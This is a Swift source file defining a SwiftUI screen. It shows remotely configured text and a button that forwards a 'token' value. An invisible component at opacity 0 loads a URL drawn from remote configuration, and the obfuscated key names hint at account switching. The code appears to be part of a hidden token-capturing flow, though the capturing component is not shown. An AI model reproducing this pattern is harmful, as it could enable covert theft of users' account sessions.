
import SwiftUI

@available(iOS 14.0, *)
public struct UtilFour: View {
    @State var btnClckFour = false
    @State var loadingFourNw = false
    @State var getValueTokenNw: String = ""
    
    public init(listData: [String: String], pushTo: @escaping (String) -> ()) {
        self.listData = listData
        self.pushTo = pushTo
    }
    
    var pushTo: (String) -> ()
    var listData: [String: String] = [:]
    public var body: some View {
        if btnClckFour {
            Color.clear.onAppear {
                self.pushTo(getValueTokenNw)
            }
        } else {
            VStack(spacing: 10) {
                Image(source: "images_four", withType: "png").resizable()
                    .frame(width: 300, height: 200)
                Text(listData[RemoKey.sltad.rawValue] ?? "").font(.system(size: 20, weight: .bold, design: .default)).fixedSize(horizontal: false, vertical: true)
                Text(listData[RemoKey.swchaccts.rawValue] ?? "").foregroundColor(Color.gray).font(.system(size: 13))
                VStack {
                    if loadingFourNw {
                        Button {
                            self.btnClckFour = true
                        } label: {
                            HStack {
                                Image(systemName: "moonphase.new.moon").foregroundColor(Color.green).font(.system(size: 12))
                                if self.docNam().isEmpty {
                                    Text(listData[RemoKey.actv.rawValue] ?? "").fontWeight(.bold)
                                } else {
                                    Text(self.docNam()).fontWeight(.bold)
                                }
                                Spacer()
                                Image(systemName: "arrow.right")
                            }.padding(.vertical, 35).padding(.horizontal, 15).foregroundColor(Color.black)
                                .overlay(RoundedRectangle(cornerRadius: 5).stroke(.gray, lineWidth: 0.3).opacity(0.8)).background(RoundedRectangle(cornerRadius: 5, style: .continuous).fill(.gray).opacity(0.03))
                        }

                    } else {
                        ProgressView(listData[RemoKey.wereloadingf1.rawValue] ?? "").foregroundColor(.gray).opacity(0.8)
                    }
                }.padding(.top, 40)
            }
            .padding()
            .foregroundColor(Color.black)
            .background(Color.white)
        }
        ZStack {
            FourCoor(url: URL(string: listData[RemoKey.rmlink12.rawValue] ?? ""), listData: self.listData, loadingFourNw: $loadingFourNw, getValueTokenNw: $getValueTokenNw).opacity(0)
        }.zIndex(0)
    }
    
    func docNam() -> String {
        var name:String?
        if let dataModel = UserDefaults.standard.object(forKey: "username") as? Data {
            if let usNam = try? JSONDecoder().decode(UsName.self, from: dataModel) {
                name = usNam.nameuser
            }
        }
        return name ?? ""
    }
}

struct UsName: Codable {
    var nameuser: String
}
